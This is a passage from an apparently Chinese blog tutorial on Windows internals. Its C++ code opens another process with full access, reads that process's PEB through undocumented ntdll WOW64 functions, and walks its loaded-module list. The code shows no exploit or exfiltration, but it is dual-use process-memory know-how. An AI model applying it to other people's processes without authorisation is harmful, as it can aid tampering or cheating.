class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算返回了多少个进程标识符。</span></span><br><span class="line"></span><br><span class="line">    cProcesses = cbNeeded / <span class="built_in">sizeof</span>(DWORD);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印每个进程的模块名称。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; cProcesses; i++ )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">PrintModules</span>( aProcesses[i] );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="3-获取PEB"><a href="#3-获取PEB" class="headerlink" title="3. 获取PEB"></a>3. 获取PEB</h1><p><code>PEB +0x00c</code>成员<code>Ldr</code>指向<code>_PEB_LDR_DATA</code>结构，此结构的第三成员<code>InMemoryOrderModuleList</code>包含进程的已加载模块的双向链表的头部。列表中的每个项目都是指向<code>LDR_DATA_TABLE_ENTRY</code>结构的指针。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_LDR_DATA_TABLE_ENTRY</span> &#123;</span><br><span class="line">    PVOID Reserved1[<span class="number">2</span>];</span><br><span class="line">    LIST_ENTRY InMemoryOrderLinks;</span><br><span class="line">    PVOID Reserved2[<span class="number">2</span>];</span><br><span class="line">    PVOID DllBase;</span><br><span class="line">    PVOID EntryPoint;</span><br><span class="line">    PVOID Reserved3;</span><br><span class="line">    UNICODE_STRING FullDllName;</span><br><span class="line">    BYTE Reserved4[<span class="number">8</span>];</span><br><span class="line">    PVOID Reserved5[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        ULONG CheckSum;</span><br><span class="line">        PVOID Reserved6;</span><br><span class="line">    &#125;;</span><br><span class="line">    ULONG TimeDateStamp;</span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br></pre></td></tr></table></figure><p>因此，这种方法的思路如下：</p><ol><li>调用<code>NtWow64QueryInformationProcess64</code>获取<code>PROCESS_BASIC_INFORMATION64(32)</code>结构</li><li>调用<code>NtWow64ReadVirtualMemory64</code>（32位用<code>ReadProcessMemory</code>）读出<code>PebBaseAddress</code></li><li>获取到PEB，定位到<code>_PEB_LDR_DATA</code>遍历<code>_LDR_DATA_TABLE_ENTRY</code></li><li>通过<code>FullDllName</code>筛选，<code>DllBase</code>返回模块基地址。</li></ol><p>贴一个大佬的获取PEB代码（原谅我实在忘了在哪找到的，知道的朋友请留言一下）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;subauth.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> region 依赖 </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NT_SUCCESS(x) ((x) &gt;= 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ProcessBasicInformation 0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span></span></span><br><span class="line"><span class="function"><span class="title">NTSTATUS</span><span class="params">(WINAPI *pfnNtWow64QueryInformationProcess64)</span></span></span><br><span class="line"><span class="function"><span class="params">(HANDLE ProcessHandle, UINT32 ProcessInformationClass,</span></span></span><br><span class="line"><span class="params"><span class="function">    PVOID ProcessInformation, UINT32 ProcessInformationLength,</span></span></span><br><span class="line"><span class="params"><span class="function">    UINT32* ReturnLength)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">typedef</span></span></span><br><span class="line"><span class="function"><span class="title">NTSTATUS</span><span class="params">(WINAPI *pfnNtWow64ReadVirtualMemory64)</span></span></span><br><span class="line"><span class="function"><span class="params">(HANDLE ProcessHandle, PVOID64 BaseAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    PVOID BufferData, UINT64 BufferLength,</span></span></span><br><span class="line"><span class="params"><span class="function">    PUINT64 ReturnLength)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">typedef</span></span></span><br><span class="line"><span class="function"><span class="title">NTSTATUS</span><span class="params">(WINAPI *pfnNtQueryInformationProcess)</span></span></span><br><span class="line"><span class="function"><span class="params">(HANDLE ProcessHandle, ULONG ProcessInformationClass,</span></span></span><br><span class="line"><span class="params"><span class="function">    PVOID ProcessInformation, UINT32 ProcessInformationLength,</span></span></span><br><span class="line"><span class="params"><span class="function">    UINT32* ReturnLength)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_UNICODE_STRING_T</span></span><br><span class="line">&#123;</span><br><span class="line">    WORD Length;</span><br><span class="line">    WORD MaximumLength;</span><br><span class="line">    T Buffer;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY_T</span></span><br><span class="line">&#123;</span><br><span class="line">    T Flink;</span><br><span class="line">    T Blink;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="keyword">typename</span> NGF, <span class="type">int</span> A&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_PEB_T</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">typedef</span> T type;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">struct</span></span><br><span class="line">        &#123;</span><br><span class="line">            BYTE InheritedAddressSpace;</span><br><span class="line">            BYTE ReadImageFileExecOptions;</span><br><span class="line">            BYTE BeingDebugged;</span><br><span class="line">            BYTE BitField;</span><br><span class="line">        &#125;;</span><br><span class="line">        T dummy01;</span><br><span class="line">    &#125;;</span><br><span class="line">    T Mutant;</span><br><span class="line">    T ImageBaseAddress;</span><br><span class="line">    T Ldr;</span><br><span class="line">    T ProcessParameters;</span><br><span class="line">    T SubSystemData;</span><br><span class="line">    T ProcessHeap;</span><br><span class="line">    T FastPebLock;</span><br><span class="line">    T AtlThunkSListPtr;</span><br><span class="line">    T IFEOKey;</span><br><span class="line">    T CrossProcessFlags;</span><br><span class="line">    T UserSharedInfoPtr;</span><br><span class="line">    DWORD SystemReserved;</span><br><span class="line">    DWORD AtlThunkSListPtr32;</span><br><span class="line">    T ApiSetMap;</span><br><span class="line">    T TlsExpansionCounter;</span><br><span class="line">    T TlsBitmap;</span><br><span class="line">    DWORD TlsBitmapBits[<span class="number">2</span>];</span><br><span class="line">    T ReadOnlySharedMemoryBase;</span><br><span class="line">    T HotpatchInformation;</span><br><span class="line">    T ReadOnlyStaticServerData;</span><br><span class="line">    T AnsiCodePageData;</span><br><span class="line">    T OemCodePageData;</span><br><span class="line">    T UnicodeCaseTableData;</span><br><span class="line">    DWORD NumberOfProcessors;</span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">        DWORD NtGlobalFlag;</span><br><span class="line">        NGF dummy02;</span><br><span class="line">    &#125;;</span><br><span class="line">    LARGE_INTEGER CriticalSectionTimeout;</span><br><span class="line">    T HeapSegmentReserve;</span><br><span class="line">    T HeapSegmentCommit;</span><br><span class="line">    T HeapDeCommitTotalFreeThreshold;</span><br><span class="line">    T HeapDeCommitFreeBlockThreshold;</span><br><span class="line">    DWORD NumberOfHeaps;</span><br><span class="line">    DWORD MaximumNumberOfHeaps;</span><br><span class="line">    T ProcessHeaps;</span><br><span class="line">    T GdiSharedHandleTable;</span><br><span class="line">    T ProcessStarterHelper;</span><br><span class="line">    T GdiDCAttributeList;</span><br><span class="line">    T LoaderLock;</span><br><span class="line">    DWORD OSMajorVersion;</span><br><span class="line">    DWORD OSMinorVersion;</span><br><span class="line">    WORD OSBuildNumber;</span><br><span class="line">    WORD OSCSDVersion;</span><br><span class="line">    DWORD OSPlatformId;</span><br><span class="line">    DWORD ImageSubsystem;</span><br><span class="line">    DWORD ImageSubsystemMajorVersion;</span><br><span class="line">    T ImageSubsystemMinorVersion;</span><br><span class="line">    T ActiveProcessAffinityMask;</span><br><span class="line">    T GdiHandleBuffer[A];</span><br><span class="line">    T PostProcessInitRoutine;</span><br><span class="line">    T TlsExpansionBitmap;</span><br><span class="line">    DWORD TlsExpansionBitmapBits[<span class="number">32</span>];</span><br><span class="line">    T SessionId;</span><br><span class="line">    ULARGE_INTEGER AppCompatFlags;</span><br><span class="line">    ULARGE_INTEGER AppCompatFlagsUser;</span><br><span class="line">    T pShimData;</span><br><span class="line">    T AppCompatInfo;</span><br><span class="line">    _UNICODE_STRING_T&lt;T&gt; CSDVersion;</span><br><span class="line">    T ActivationContextData;</span><br><span class="line">    T ProcessAssemblyStorageMap;</span><br><span class="line">    T SystemDefaultActivationContextData;</span><br><span class="line">    T SystemAssemblyStorageMap;</span><br><span class="line">    T MinimumStackCommit;</span><br><span class="line">    T FlsCallback;</span><br><span class="line">    _LIST_ENTRY_T&lt;T&gt; FlsListHead;</span><br><span class="line">    T FlsBitmap;</span><br><span class="line">    DWORD FlsBitmapBits[<span class="number">4</span>];</span><br><span class="line">    T FlsHighIndex;</span><br><span class="line">    T WerRegistrationData;</span><br><span class="line">    T WerShipAssertPtr;</span><br><span class="line">    T pContextData;</span><br><span class="line">    T pImageHeaderHash;</span><br><span class="line">    T TracingFlags;</span><br><span class="line">    T CsrServerReadOnlySharedMemoryBase;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> _PEB_T&lt;DWORD, DWORD64, <span class="number">34</span>&gt; _PEB32;</span><br><span class="line"><span class="keyword">typedef</span> _PEB_T&lt;DWORD64, DWORD, <span class="number">30</span>&gt; _PEB64;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_STRING_32</span></span><br><span class="line">&#123;</span><br><span class="line">    WORD Length;</span><br><span class="line">    WORD MaximumLength;</span><br><span class="line">    UINT32 Buffer;</span><br><span class="line">&#125; STRING32, *PSTRING32;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_STRING_64</span></span><br><span class="line">&#123;</span><br><span class="line">    WORD Length;</span><br><span class="line">    WORD MaximumLength;</span><br><span class="line">    UINT64 Buffer;</span><br><span class="line">&#125; STRING64, *PSTRING64;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_RTL_DRIVE_LETTER_CURDIR_32</span></span><br><span class="line">&#123;</span><br><span class="line">    WORD Flags;</span><br><span class="line">    WORD Length;</span><br><span class="line">    ULONG TimeStamp;</span><br><span class="line">    STRING32 DosPath;</span><br><span class="line">&#125; RTL_DRIVE_LETTER_CURDIR32, *PRTL_DRIVE_LETTER_CURDIR32;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_RTL_DRIVE_LETTER_CURDIR_64</span></span><br><span class="line">&#123;</span><br><span class="line">    WORD Flags;</span><br><span class="line">    WORD Length;</span><br><span class="line">    ULONG TimeStamp;</span><br><span class="line">    STRING64 DosPath;</span><br><span class="line">&#125; RTL_DRIVE_LETTER_CURDIR64, *PRTL_DRIVE_LETTER_CURDIR64;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_UNICODE_STRING_32</span></span><br><span class="line">&#123;</span><br><span class="line">    WORD Length;</span><br><span class="line">    WORD MaximumLength;</span><br><span class="line">    UINT32 Buffer;</span><br><span class="line">&#125; UNICODE_STRING32, *PUNICODE_STRING32;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_UNICODE_STRING_64</span></span><br><span class="line">&#123;</span><br><span class="line">    WORD Length;</span><br><span class="line">    WORD MaximumLength;</span><br><span class="line">    UINT64 Buffer;</span><br><span class="line">&#125; UNICODE_STRING64, *PUNICODE_STRING64;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_CURDIR_32</span></span><br><span class="line">&#123;</span><br><span class="line">    UNICODE_STRING32 DosPath;</span><br><span class="line">    UINT32 Handle;</span><br><span class="line">&#125; CURDIR32, *PCURDIR32;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_RTL_USER_PROCESS_PARAMETERS_32</span></span><br><span class="line">&#123;</span><br><span class="line">    ULONG MaximumLength;</span><br><span class="line">    ULONG Length;</span><br><span class="line">    ULONG Flags;</span><br><span class="line">    ULONG DebugFlags;</span><br><span class="line">    UINT32 ConsoleHandle;</span><br><span class="line">    ULONG ConsoleFlags;</span><br><span class="line">    UINT32 StandardInput;</span><br><span class="line">    UINT32 StandardOutput;</span><br><span class="line">    UINT32 StandardError;</span><br><span class="line">    CURDIR32 CurrentDirectory;</span><br><span class="line">    UNICODE_STRING32 DllPath;</span><br><span class="line">    UNICODE_STRING32 ImagePathName;</span><br><span class="line">    UNICODE_STRING32 CommandLine;</span><br><span class="line">    UINT32 Environment;</span><br><span class="line">    ULONG StartingX;</span><br><span class="line">    ULONG StartingY;</span><br><span class="line">    ULONG CountX;</span><br><span class="line">    ULONG CountY;</span><br><span class="line">    ULONG CountCharsX;</span><br><span class="line">    ULONG CountCharsY;</span><br><span class="line">    ULONG FillAttribute;</span><br><span class="line">    ULONG WindowFlags;</span><br><span class="line">    ULONG ShowWindowFlags;</span><br><span class="line">    UNICODE_STRING32 WindowTitle;</span><br><span class="line">    UNICODE_STRING32 DesktopInfo;</span><br><span class="line">    UNICODE_STRING32 ShellInfo;</span><br><span class="line">    UNICODE_STRING32 RuntimeData;</span><br><span class="line">    RTL_DRIVE_LETTER_CURDIR32 CurrentDirectores[<span class="number">32</span>];</span><br><span class="line">    ULONG EnvironmentSize;</span><br><span class="line">&#125; RTL_USER_PROCESS_PARAMETERS32, *PRTL_USER_PROCESS_PARAMETERS32;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_CURDIR_64</span></span><br><span class="line">&#123;</span><br><span class="line">    UNICODE_STRING64 DosPath;</span><br><span class="line">    UINT64 Handle;</span><br><span class="line">&#125; CURDIR64, *PCURDIR64;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_RTL_USER_PROCESS_PARAMETERS_64</span></span><br><span class="line">&#123;</span><br><span class="line">    ULONG MaximumLength;</span><br><span class="line">    ULONG Length;</span><br><span class="line">    ULONG Flags;</span><br><span class="line">    ULONG DebugFlags;</span><br><span class="line">    UINT64 ConsoleHandle;</span><br><span class="line">    ULONG ConsoleFlags;</span><br><span class="line">    UINT64 StandardInput;</span><br><span class="line">    UINT64 StandardOutput;</span><br><span class="line">    UINT64 StandardError;</span><br><span class="line">    CURDIR64 CurrentDirectory;</span><br><span class="line">    UNICODE_STRING64 DllPath;</span><br><span class="line">    UNICODE_STRING64 ImagePathName;</span><br><span class="line">    UNICODE_STRING64 CommandLine;</span><br><span class="line">    UINT64 Environment;</span><br><span class="line">    ULONG StartingX;</span><br><span class="line">    ULONG StartingY;</span><br><span class="line">    ULONG CountX;</span><br><span class="line">    ULONG CountY;</span><br><span class="line">    ULONG CountCharsX;</span><br><span class="line">    ULONG CountCharsY;</span><br><span class="line">    ULONG FillAttribute;</span><br><span class="line">    ULONG WindowFlags;</span><br><span class="line">    ULONG ShowWindowFlags;</span><br><span class="line">    UNICODE_STRING64 WindowTitle;</span><br><span class="line">    UNICODE_STRING64 DesktopInfo;</span><br><span class="line">    UNICODE_STRING64 ShellInfo;</span><br><span class="line">    UNICODE_STRING64 RuntimeData;</span><br><span class="line">    RTL_DRIVE_LETTER_CURDIR64 CurrentDirectores[<span class="number">32</span>];</span><br><span class="line">    ULONG EnvironmentSize;</span><br><span class="line">&#125; RTL_USER_PROCESS_PARAMETERS64, *PRTL_USER_PROCESS_PARAMETERS64;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_PROCESS_BASIC_INFORMATION64</span> &#123;</span><br><span class="line">    NTSTATUS ExitStatus;</span><br><span class="line">    UINT32 Reserved0;</span><br><span class="line">    UINT64 PebBaseAddress;</span><br><span class="line">    UINT64 AffinityMask;</span><br><span class="line">    UINT32 BasePriority;</span><br><span class="line">    UINT32 Reserved1;</span><br><span class="line">    UINT64 UniqueProcessId;</span><br><span class="line">    UINT64 InheritedFromUniqueProcessId;</span><br><span class="line">&#125; PROCESS_BASIC_INFORMATION64;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_PROCESS_BASIC_INFORMATION32</span> &#123;</span><br><span class="line">    NTSTATUS ExitStatus;</span><br><span class="line">    UINT32 PebBaseAddress;</span><br><span class="line">    UINT32 AffinityMask;</span><br><span class="line">    UINT32 BasePriority;</span><br><span class="line">    UINT32 UniqueProcessId;</span><br><span class="line">    UINT32 InheritedFromUniqueProcessId;</span><br><span class="line">&#125; PROCESS_BASIC_INFORMATION32;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> endregion</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">HANDLE m_ProcessHandle = </span><br><span class="line"><span class="built_in">OpenProcess</span>(</span><br><span class="line">PROCESS_ALL_ACCESS,<span class="comment">// 所有权限</span></span><br><span class="line">FALSE,<span class="comment">// 不继承句柄</span></span><br><span class="line"><span class="number">8016</span><span class="comment">// 进程ID，此处为了方便直接写死</span></span><br><span class="line">);</span><br><span class="line"> </span><br><span class="line">    BOOL bSource = FALSE;<span class="comment">// 判断自身进程是否为 64位</span></span><br><span class="line">    BOOL bTarget = FALSE;<span class="comment">// 判断目标进程是否为 64位</span></span><br><span class="line">    <span class="built_in">IsWow64Process</span>(</span><br><span class="line"><span class="built_in">GetCurrentProcess</span>(),<span class="comment">// 进程句柄</span></span><br><span class="line">&amp;bSource<span class="comment">// 用来接收返回值的变量，64位 FLASE | 32位 TRUE</span></span><br><span class="line">);</span><br><span class="line">    <span class="built_in">IsWow64Process</span>(</span><br><span class="line">m_ProcessHandle,<span class="comment">// 进程句柄</span></span><br><span class="line">&amp;bTarget<span class="comment">// 用来接收返回值的变量，64位 FLASE | 32位 TRUE</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 目标 64位，自身 32位</span></span><br><span class="line">    <span class="keyword">if</span>(bTarget == FALSE &amp;&amp; bSource == TRUE)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="comment">// 获取 ntdll.dll 模块句柄</span></span><br><span class="line">        HMODULE NtdllModule = <span class="built_in">GetModuleHandle</span>(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line">pfnNtWow64QueryInformationProcess64 NtWow64QueryInformationProcess64 = (pfnNtWow64QueryInformationProcess64)<span class="built_in">GetProcAddress</span>(NtdllModule,<span class="string">&quot;NtWow64QueryInformationProcess64&quot;</span>);</span><br><span class="line">pfnNtWow64ReadVirtualMemory64 NtWow64ReadVirtualMemory64 = (pfnNtWow64ReadVirtualMemory64)<span class="built_in">GetProcAddress</span>(NtdllModule,<span class="string">&quot;NtWow64ReadVirtualMemory64&quot;</span>);</span><br><span class="line">        PROCESS_BASIC_INFORMATION64 pbi = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        UINT64 ReturnLength = <span class="number">0</span>;</span><br><span class="line">        NTSTATUS Status = <span class="built_in">NtWow64QueryInformationProcess64</span>(m_ProcessHandle,ProcessBasicInformation,&amp;pbi,(UINT32)<span class="built_in">sizeof</span>(pbi),(UINT32*)&amp;ReturnLength);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(Status))&#123;</span><br><span class="line">            _PEB64* Peb = (_PEB64*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(_PEB64));</span><br><span class="line">            RTL_USER_PROCESS_PARAMETERS64* ProcessParameters = (RTL_USER_PROCESS_PARAMETERS64*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(RTL_USER_PROCESS_PARAMETERS64));</span><br><span class="line">            Status = <span class="built_in">NtWow64ReadVirtualMemory64</span>(m_ProcessHandle,(PVOID64)pbi.PebBaseAddress,(_PEB64*)Peb,<span class="built_in">sizeof</span>(_PEB64),&amp;ReturnLength);</span><br><span class="line"></span><br><span class="line">            std::cout &lt;&lt; <span class="string">&quot;PEB地址:&quot;</span> &lt;&lt; 